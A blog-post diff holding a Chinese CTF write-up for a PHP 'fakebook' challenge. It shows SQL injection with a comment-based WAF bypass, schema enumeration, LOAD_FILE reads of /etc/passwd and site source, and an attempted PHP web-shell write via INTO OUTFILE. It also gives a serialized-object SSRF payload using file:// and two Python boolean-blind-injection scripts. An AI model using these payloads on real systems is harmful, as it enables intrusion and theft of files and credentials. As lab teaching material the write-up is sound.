@@ -1,0 +1,337 @@
+---
+layout: post
+title:  "2019-11-28-01"
+description: You know, madness is a lot like gravity… sometimes all you need is a little push
+date:   2019-11-28-01
+tags: ssrf sql手注 python sql布尔盲注 绕过waf 网站文件泄露扫描 序列化与反序列化
+excerpt_separator: ~~~
+---
+1.扫描网站目录,是否存在源码泄露(+1)
+
+2.sql手注 参考:/看过的文档/SQL注入使用详细总结（由浅及深，持续更新中） - MX的博客 - CSDN博客.html
+
+3.waf绕过union select的过滤
+
+4.limit的使用
+
+5.ssrf读取本地文件,利用curl对file协议进行读取(这里的curl支持file和http协议)
+
+6.序列化与反序列化--unserialize和serialize
+
+7.load_file()读取文件
+
+8.sql注入之布尔盲注(+1)
+
+~~~
+首先打开网站
+
+点击join
+
+输入注册信息,注册成功后回到主页
+
+主页显示如下
+
+![My helpful screenshot](/assets/img/2019-11-28-01/1.png)
+
+点击login,即进入login.php页面进行登陆,输入之前注册的信息
+
+但发现登陆后还是回到首页,这道题应该和登陆无关
+
+继续寻找,发现在首页发现用户名可以点击,其链接到view.php?no=1的页面
+
+![My helpful screenshot](/assets/img/2019-11-28-01/2.png)
+
+考虑sql注入
+
+测试注入点(可手注也可sqlmap跑,此次我是手注)
+
+其实这里的注入点很简单
+```
+2 and 1=1
+```
+成功,无报错
+
+测列数
+```
+2 order by 4(从1开始)
+```
+4列
+
+构造```1 and 1=1 union select 1,2,3,4```发现无效,应该有过滤
+
+![My helpful screenshot](/assets/img/2019-11-28-01/3.png)
+
+单独测试union和select没有问题,应该是整体进行过滤,于是构造
+```
+1 and 1=1 union/**/select 1,2,3,4
+```
+成功
+
+由于这里只显示一条数据,直接(1和2都有数据,不利于展示)
+```
+0 and 1=1 union/**/select 1,2,3,4
+```
+(在后面加limit指定范围的行也行)
+
+开始常规爆库,爆表名,爆字段
+
+```2 and 1=2 union/**/select 1,2,3,4``` -->  Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31(有序列化问题存在)
+
+```0 and 1=2 union/**/select user(),database(),version(),4```  --> fakebook 
+
+发现只有位置2的数据才可以在网页显示出来(limit 0,4,意思是从第0条数据开始往后推4条数据,一共返回4条数据)
+
+```0 and 1=2 union/**/select database(),user(),version(),4``` --> root@localhost	
+
+```0 and 1=2 union/**/select 1,SCHEMA_NAME,4,5 from information_schema.SCHEMATA limit 0,4``` --> fakebook
+
+```0 and 1=2 union/**/select 1,SCHEMA_NAME,4,5 from information_schema.SCHEMATA limit 1,4``` --> information_schema	
+
+```0 and 1=2 union/**/select 1,SCHEMA_NAME,4,5 from information_schema.SCHEMATA limit 2,4``` --> mysql
+
+```0 and 1=2 union/**/select 1,SCHEMA_NAME,4,5 from information_schema.SCHEMATA limit 3,4``` -->performance_schema
+
+```0 and 1=2 union/**/select 1,SCHEMA_NAME,4,5 from information_schema.SCHEMATA limit 4,4``` -->test
+
+爆当前库下的表名(limit一直试,发现只有一个)
+
+```0 and 1=2 union/**/select 2,TABLE_NAME,4,5 from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,4``` --> users
+
+爆字段(省略了一部分,与第一个大同小异)
+
+```0 and 1=2 union/**/select 2,COLUMN_NAME,4,5 from information_schema.COLUMNS where TABLE_NAME= 'users' limit 0,4```(users记得加'') --> no
+
+字段名:(爆出来的字段如下)
+
+no username passwd data USER CURRENT_CONNECTIONS TOTAL_CONNECTIONS	
+
+查看内容
+
+```0 and 1=2 union/**/select 2,username,4,5 from users limit 0,1``` --> a
+
+```0 and 1=2 union/**/select 2,data,4,5 from users limit 0,1```(发现还是原本注册的数据,不过这里的data是序列化后的结果,根据前面报的反序列化错误,猜测我们某个地方应该要输入序列化的数据)
+
+所以现在得到的信息是:
+
+1.某个地方应该要输入序列化的数据
+
+2.这题的flag不是放在数据库里(因为爆完了都没找到)
+
+继续尝试读取文件
+```
+0 and 1=2 union/**/select 2,LOAD_FILE('/etc/passwd'),4,5 from users limit 0,1
+```
+
+![My helpful screenshot](/assets/img/2019-11-28-01/5.png)
+
+竟然成功了...
+
+尝试读取以下
+```
+0 and 1=2 union/**/select 2,LOAD_FILE('/var/www/html/db.php'),4,5 from users limit 0,1
+0 and 1=2 union/**/select 2,LOAD_FILE('/var/www/html/view.php'),4,5 from users limit 0,1
+0 and 1=2 union/**/select '<? system($_GET['c']); ?>' into outfile '/var/www/html/db.php'(无权限)
+0 and 1=2 union/**/select 2,LOAD_FILE('/var/www/html/view.php'),4,5 from users(这里的字段数要和前面select的字段数一样,这里只能是4个,不能多不能少)
+```
+(login.php什么的,都看了一次)
+但好像没有什么帮助...好吧,只能看wp
+
+!!!!!!!!!!!!!!!!!
+
+好吧,忽略了这种情况下应该扫描目录...获取更多信息
+
+得到user.php.bak和flag.php两个文件(多扫描几次...)
+
+user.php.bak代码如下:
+```php
+<?php
+
+
+class UserInfo
+{
+    public $name = "";
+    public $age = 0;
+    public $blog = "";
+
+    public function __construct($name, $age, $blog)
+    {
+        $this->name = $name;
+        $this->age = (int)$age;
+        $this->blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this->get($this->blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this->blog;
+        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
+    }
+
+}
+```
+
+看了user.php.bak,估计是读取ssrf漏洞,读取flag.php
+
+那为什么不用LOAD_FILE()直接读取?
+
+原因如下:
+
+(为什么读不了flag.php?个人理解!!!!(可能有问题)因为load_file()只是将文件读了,将里面的东西作为字符串读出来,即相当于select 2,"<?php .........?>",4,5(注:,这里像select 表名等,而不是完全是select 字符串(字符串会带双引号),如果真是字符串就不会代码执行了).但这样会导致代码执行(如在php代码里,$a=<?php .........?>;,php执行过程中遇到<?php会执行里面的代码,所以看不到源码.有点类似于文件包含).
+
+我们发现view.php页面将分别在四个位置将查询出来的数据展示出来(select语句得到的内容为某种格式的数据(如.json),将其存于一个变量里(如tatal),后面在将相应数据放入相应变量(如将表中username1字段的数据整理出来放入username变量里),然后在前端将含有相应数据的相应变量输出到相应的位置),(select 4,5,6,7会将4,5,6,7作为字符串分别添加到最后的表的最后).
+
+在这里,view.php的数据会对从select返回的数据进行展示,但只会显示一条记录,且会对字符串进行反序列化的操作,2号位显示正常(2 and 1=1 union/**/select 2,'b',2,'b.html',会显示b).从user.php.bak里可以看到会对$this->blog进行某些操作,然后将返回结果输出,我们发现刚好对应报错getBlogContents()的位置.猜测通过select某个字符串可以触发ssrf漏洞.有四个位置,猜测这道题不是上面说的'将含有相应数据的相应变量输出到相应的位置'这种情况,应该是'将含有相应数据的相应变量取其中一个相应变量,再将该相应变量里的对应数据输出')实例如下:
+```
+表里:
+admin             username1         age               blog
+
+select 'a',2,3,4,返回:
+admin             username1         age               blog
+a                 2                 3                 '{author:me,url:file://....}'
+
+json格式数据(实际中可能是其他格式)
+{
+	admin:{
+		a:{
+			username1:2,
+			age:3,
+			blog:{
+				author:me,
+				url:file://....
+			}
+		}
+	}
+}
+
+php取回json,赋值:
+$name = admin.a.username1
+$age = admin.a.age
+$blog = admin.a.blog
+
+展示:
+位置一:$name
+位置二:$age
+位置三:$blog
+
+而这里的情况是:(大概是这样,这道题还有类UserInfo等,结构稍微再复杂一点)
+位置一:$name
+位置二:$blog.author
+位置三:$blog.url
+位置三:$blog.url经过某些处理(getBlogContents())
+```
+所以!!!!!!!!!!!!!!!!!!
+
+只需要选择select 1,2,3,4中的一个字段改为字符串(不清楚选的是哪个,一个个试就行)
+
+这里的2字段是展示在view.php页面username下的(类似上面的$name的数据),只有1,3,4是将(类似上面$blog下的数据)数据反序列化处理再显示,而且4位置的数据不是简简单单拿($blog.url),而是用getBlogContents()处理得出来的数据再展示到4位置
+
+由下可以证明上面的想法,LOAD_FILE和序列化一起用不会引起展示位置冲突
+```
+0 and 1=2 union/**/select 2,LOAD_FILE('/etc/passwd'),4,'O:8:"UserInfo":3:{s:4:"name";i:1;s:3:"age";i:2;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' from users 
+```
+user.php.bak里的curl支持file协议
+
+file协议和http协议的区别:https://www.cnblogs.com/lishanlei/p/9327646.html
+
+简单来说就是file是读本地文件.file协议用于访问本地计算机中的文件，好比通过资源管理器中打开文件一样，需要主要的是它是针对本地的，即file协议是访问你本机的文件资源
+
+这两种会使php代码执行(1)直接在网站打开.(2)使用LOAD_FILE()直接读取.而执行的flag.php看不到任何内容(flag估计是藏在源码里).但可以使用file协议读取文件(在这里和LOAD_FILE()直接读取不一样,利用curl对file协议的支持可以读取文件的源代码)
+
+(但这里可以用LOAD_FILE()进行布尔盲注,源码照样给爆出来)
+
+好了,下面说下最终解题:
+
+## 一.反序列化解题:
+构造:((1)数据结构可以从sql注入后爆的data字段看出(2)数据结构也可以从user.php.bak看出(主要))
+```
+no = 0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";i:1;s:3:"age";i:2;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+```
+## 二.布尔盲注:
+第一种:(利用二分法)
+```python
+import requests
+
+url = 'http://db8f9134-951a-489a-9a8c-a87b93455801.node3.buuoj.cn/view.php?no='
+result = ''
+
+for x in range(0, 100):
+    high = 127
+    low = 32
+    mid = (low + high) // 2
+    while high > low:
+        payload = "if(ascii(substr((load_file('/var/www/html/flag.php')),%d,1))>%d,1,0)" % (x, mid)
+        response = requests.get(url + payload)
+        # print(response.text)
+        if 'a.html' in response.text:#a.html是当初注册时加进去的.开始时犯傻,选"a",结果怎样都注不出...
+            low = mid + 1
+        else:
+            high = mid
+        # print(low)
+        # print(high)
+        mid = (low + high) // 2
+        print(mid)
+
+    result += chr(int(mid))
+    print(result)
+```
+![My helpful screenshot](/assets/img/2019-11-28-01/4.png)
+
+第二种:(参考之前的脚本)
+```python
+import requests
+import string
+
+url="http://db8f9134-951a-489a-9a8c-a87b93455801.node3.buuoj.cn/view.php"
+temp=''
+str1=string.printable
+for i in range(1,100):
+    for a in str1:
+        params={#if 也可以
+            'no':f'0^(ascii(substr((load_file("/var/www/html/flag.php")),{i},1))={ord(a)})'
+        }
+        rep= requests.post(url=url,params=params)
+        print(params)
+        # print(rep.text)
+        if 'a.html' in rep.text:
+            temp+=a
+            print('[+] output: '+temp)
+            break
+```
+![My helpful screenshot](/assets/img/2019-11-28-01/6.png)
+
+## 知识点:
+1.扫描网站目录,是否存在源码泄露(+1)
+
+2.sql手注 参考:/看过的文档/SQL注入使用详细总结（由浅及深，持续更新中） - MX的博客 - CSDN博客.html
+
+3.waf绕过union select的过滤
+
+4.limit的使用
+
+5.ssrf读取本地文件,利用curl对file协议进行读取(这里的curl支持file和http协议)
+
+6.序列化与反序列化--unserialize和serialize
+
+7.load_file()读取文件
+
+8.sql注入之布尔盲注(+1)
